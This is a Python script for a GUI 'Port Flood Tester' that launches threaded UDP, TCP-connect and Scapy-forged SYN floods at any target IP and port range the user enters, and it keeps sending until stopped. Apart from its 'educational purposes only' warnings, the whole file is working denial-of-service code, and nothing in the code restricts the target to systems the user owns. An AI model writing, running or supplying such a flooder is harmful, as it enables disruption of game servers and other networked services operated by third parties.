#!/usr/bin/env python3
"""
Port Flooding Test Script (GUI Version)

This script generates moderate traffic to test game DDoS prevention.
For EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have permission to test.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import socket
import threading
import time
import queue
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import IP, TCP, RandShort, Raw, send, conf
    import scapy.arch.windows as windows
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class RedirectText:
    def __init__(self, text_widget, queue):
        self.text_widget = text_widget
        self.queue = queue

    def write(self, string):
        self.queue.put(string)

    def flush(self):
        pass

class FloodTesterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Port Flood Tester")
        self.root.geometry("800x600")
        
        # Variables
        self.is_running = False
        self.executor = None
        self.log_queue = queue.Queue()
        
        # Create main frame
        main_frame = ttk.Frame(root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Input fields
        self.create_input_fields(main_frame)
        
        # Mode selection
        self.create_mode_selection(main_frame)
        
        # Buttons
        self.create_buttons(main_frame)
        
        # Log display
        self.create_log_display(main_frame)
        
        # Start queue processing
        self.process_log_queue()
        
        # Configure grid weights
        self.configure_grid()
        
        # Warning message
        self.show_warning()

    def create_input_fields(self, parent):
        # Target IP
        ttk.Label(parent, text="Target IP:").grid(row=0, column=0, sticky=tk.W)
        self.target_ip = ttk.Entry(parent)
        self.target_ip.insert(0, "127.0.0.1")
        self.target_ip.grid(row=0, column=1, sticky=(tk.W, tk.E))
        
        # Port range
        ttk.Label(parent, text="Port Range:").grid(row=1, column=0, sticky=tk.W)
        port_frame = ttk.Frame(parent)
        port_frame.grid(row=1, column=1, sticky=(tk.W, tk.E))
        
        self.port_start = ttk.Entry(port_frame, width=10)
        self.port_start.insert(0, "6520")
        self.port_start.pack(side=tk.LEFT)
        
        ttk.Label(port_frame, text=" - ").pack(side=tk.LEFT)
        
        self.port_end = ttk.Entry(port_frame, width=10)
        self.port_end.insert(0, "6540")
        self.port_end.pack(side=tk.LEFT)
        
        # Packet size
        ttk.Label(parent, text="Packet Size (bytes):").grid(row=2, column=0, sticky=tk.W)
        self.packet_size = ttk.Entry(parent)
        self.packet_size.insert(0, "1024")
        self.packet_size.grid(row=2, column=1, sticky=(tk.W, tk.E))
        
        # Thread count
        ttk.Label(parent, text="Threads:").grid(row=3, column=0, sticky=tk.W)
        self.threads = ttk.Entry(parent)
        self.threads.insert(0, "5")
        self.threads.grid(row=3, column=1, sticky=(tk.W, tk.E))
        
        # Delay
        ttk.Label(parent, text="Delay (seconds):").grid(row=4, column=0, sticky=tk.W)
        self.delay = ttk.Entry(parent)
        self.delay.insert(0, "0.01")
        self.delay.grid(row=4, column=1, sticky=(tk.W, tk.E))

    def create_mode_selection(self, parent):
        mode_frame = ttk.LabelFrame(parent, text="Flood Mode", padding="5")
        mode_frame.grid(row=5, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=10)
        
        self.mode_var = tk.StringVar(value="udp")
        
        ttk.Radiobutton(mode_frame, text="UDP", variable=self.mode_var, value="udp").pack(side=tk.LEFT, padx=5)
        ttk.Radiobutton(mode_frame, text="TCP", variable=self.mode_var, value="tcp").pack(side=tk.LEFT, padx=5)
        
        if SCAPY_AVAILABLE:
            ttk.Radiobutton(mode_frame, text="SYN", variable=self.mode_var, value="syn").pack(side=tk.LEFT, padx=5)
        
        ttk.Radiobutton(mode_frame, text="All", variable=self.mode_var, value="all").pack(side=tk.LEFT, padx=5)

    def create_buttons(self, parent):
        button_frame = ttk.Frame(parent)
        button_frame.grid(row=6, column=0, columnspan=2, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="Start", command=self.start_test)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="Stop", command=self.stop_test, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Clear Log", command=self.clear_log).pack(side=tk.LEFT, padx=5)

    def create_log_display(self, parent):
        log_frame = ttk.LabelFrame(parent, text="Log", padding="5")
        log_frame.grid(row=7, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def configure_grid(self):
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

    def show_warning(self):
        warning = "WARNING: This tool is for educational purposes only.\n\n"
        warning += "It should ONLY be used on systems you own or have explicit permission to test."
        messagebox.showwarning("Warning", warning)

    def process_log_queue(self):
        while True:
            try:
                message = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, message)
                self.log_text.see(tk.END)
            except queue.Empty:
                break
        self.root.after(100, self.process_log_queue)

    def validate_inputs(self):
        try:
            port_start = int(self.port_start.get())
            port_end = int(self.port_end.get())
            packet_size = int(self.packet_size.get())
            threads = int(self.threads.get())
            delay = float(self.delay.get())
            
            if port_start > port_end:
                raise ValueError("Start port must be less than or equal to end port")
            if packet_size <= 0:
                raise ValueError("Packet size must be positive")
            if threads <= 0:
                raise ValueError("Thread count must be positive")
            if delay < 0:
                raise ValueError("Delay must be non-negative")
                
            return True
        except ValueError as e:
            messagebox.showerror("Input Error", str(e))
            return False

    def start_test(self):
        if not self.validate_inputs():
            return
            
        self.is_running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        # Create thread pool
        self.executor = ThreadPoolExecutor(max_workers=int(self.threads.get()))
        
        # Start flooding in background thread
        threading.Thread(target=self.run_flood_test, daemon=True).start()

    def stop_test(self):
        self.is_running = False
        if self.executor:
            self.executor.shutdown(wait=False)
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log_text.insert(tk.END, "\nTest stopped by user.\n")

    def clear_log(self):
        self.log_text.delete(1.0, tk.END)

    def run_flood_test(self):
        target_ip = self.target_ip.get()
        port_start = int(self.port_start.get())
        port_end = int(self.port_end.get())
        packet_size = int(self.packet_size.get())
        delay = float(self.delay.get())
        mode = self.mode_var.get()
        
        ports = range(port_start, port_end + 1)
        
        # Redirect print statements to log
        import sys
        old_stdout = sys.stdout
        sys.stdout = RedirectText(self.log_text, self.log_queue)
        
        try:
            for port in ports:
                if not self.is_running:
                    break
                    
                if mode in ["udp", "all"]:
                    self.executor.submit(
                        flood_port_udp,
                        target_ip,
                        port,
                        packet_size,
                        float("inf"),  # Run until stopped
                        delay
                    )
                
                if mode in ["tcp", "all"]:
                    self.executor.submit(
                        flood_port_tcp,
                        target_ip,
                        port,
                        packet_size,
                        float("inf"),
                        delay
                    )
                    
                if mode in ["syn", "all"] and SCAPY_AVAILABLE:
                    self.executor.submit(
                        syn_flood,
                        target_ip,
                        port,
                        packet_size,
                        float("inf"),
                        delay
                    )
        finally:
            sys.stdout = old_stdout
            if self.is_running:
                self.stop_test()

def flood_port_udp(target_ip, port, packet_size, duration, delay):
    """Send UDP traffic to a specific port on the target IP."""
    end_time = time.time() + duration if duration != float("inf") else float("inf")
    packet = b"X" * packet_size
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packets_sent = 0
        print(f"Starting UDP traffic to {target_ip}:{port}")
        
        while time.time() < end_time:
            try:
                sock.sendto(packet, (target_ip, port))
                packets_sent += 1
                time.sleep(delay)
            except Exception as e:
                print(f"Error sending to {port}: {e}")
                break
                
        print(f"Completed sending {packets_sent} UDP packets to {target_ip}:{port}")
        
    except Exception as e:
        print(f"Error creating socket for {port}: {e}")
    finally:
        sock.close()

def flood_port_tcp(target_ip, port, packet_size, duration, delay):
    """Send TCP traffic to a specific port."""
    end_time = time.time() + duration if duration != float("inf") else float("inf")
    packet = b"X" * packet_size
    
    print(f"Starting TCP traffic to {target_ip}:{port}")
    packets_sent = 0
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            sock.send(packet)
            packets_sent += 1
            sock.close()
            time.sleep(delay)
        except:
            pass
            
    print(f"Completed sending {packets_sent} TCP packets to {target_ip}:{port}")

def syn_flood(target_ip, port, packet_size, duration, delay):
    """Send SYN packets without completing handshake."""
    if not SCAPY_AVAILABLE:
        print("Scapy is not installed. SYN flooding requires: pip install scapy")
        return
        
    end_time = time.time() + duration if duration != float("inf") else float("inf")
    packets_sent = 0
    
    # Configure Scapy for Windows
    if hasattr(conf, 'use_pcap') and conf.use_pcap:
        # Get the first available interface
        iface = None
        try:
            # Try to get the interface connected to the target
            from scapy.arch import get_if_addr, get_if_list
            for i in get_if_list():
                if get_if_addr(i) != "0.0.0.0":
                    iface = i
                    break
        except Exception as e:
            print(f"Error finding network interface: {e}")
            print("Trying alternative method...")
            
        if not iface:
            try:
                # Alternative method: get Windows interface
                iface = windows.get_windows_if_list()[0]['name']
            except Exception as e:
                print(f"Could not find any network interface: {e}")
                print("SYN flood requires a valid network interface")
                return
    
    # Forge IP and TCP layers
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=port, flags="S")
    raw = Raw(b"X"*packet_size)
    packet = ip / tcp / raw
    
    print(f"Starting SYN flood to {target_ip}:{port}")
    if iface:
        print(f"Using interface: {iface}")
    
    try:
        while time.time() < end_time:
            try:
                if iface:
                    send(packet, verbose=0, iface=iface)
                else:
                    send(packet, verbose=0)
                packets_sent += 1
                time.sleep(delay)
            except Exception as e:
                print(f"Error sending packet: {e}")
                time.sleep(1)  # Wait a bit before retrying
    except Exception as e:
        print(f"Error during SYN flood to {port}: {e}")
    
    print(f"Completed sending {packets_sent} SYN packets to {target_ip}:{port}")

if __name__ == "__main__":
    root = tk.Tk()
    app = FloodTesterGUI(root)
    root.mainloop() 